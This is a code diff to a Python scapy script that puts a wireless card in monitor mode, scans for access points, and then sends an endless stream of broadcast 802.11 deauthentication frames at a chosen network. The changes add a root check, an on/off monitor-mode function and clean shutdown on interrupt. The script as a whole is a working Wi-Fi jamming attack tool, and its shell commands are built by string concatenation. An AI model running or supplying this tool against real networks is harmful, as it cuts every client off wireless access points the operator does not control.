@@ -3,15 +3,28 @@
 from scapy.all import *
 from threading import Thread
 import time
+import os
+import sys
+
+if os.geteuid() != 0:
+    print("You should run this program as root")
+    sys.exit(1)
 
 iface = 'wlan0'
 networks = dict()
 
-def monitor_on(iface:str):
-    os.system('ip l set ' + iface + ' down')
-    os.system('iw dev ' + iface + ' set monitor none')
-    os.system('ip l set ' + iface + ' up')
-    print('Monitor mode set on ' +iface)
+
+def monitor(mode, iface=iface):
+    if mode == 'on':
+        os.system('ip l set ' + iface + ' down')
+        os.system('iw dev ' + iface + ' set monitor none')
+        os.system('ip l set ' + iface + ' up')
+        print('Monitor mode enabled on ' +iface)
+    if mode == 'off':
+        os.system('ip l set ' + iface + ' down')
+        os.system('iw dev ' + iface + ' set type managed')
+        os.system('ip l set ' + iface + ' up')
+        print('Monitor mode disabled on ' +iface)
 
 def callback_ap(packet):
     if packet.haslayer(Dot11Beacon):
@@ -44,7 +57,7 @@ stop_thread = False
 channel_changer = Thread(target=change_channel)
 channel_changer.daemon = True
 channel_changer.start()
-monitor_on(iface)
+monitor('on')
 sniff(prn=callback_ap, iface=iface, timeout=10)
 stop_thread = True
 channel_changer.join(timeout=1)
@@ -53,5 +66,9 @@ ap = choose_from_networks()
 client = 'ff:ff:ff:ff:ff:ff'
 
 deauth_packet = RadioTap()/Dot11(addr1=client, addr2=ap, addr3=ap)/Dot11Deauth()
-while True:
-    sendp(deauth_packet, iface=iface)
+try:
+    while True:
+        sendp(deauth_packet, iface=iface)
+except KeyboardInterrupt:
+    pass
+monitor('off')
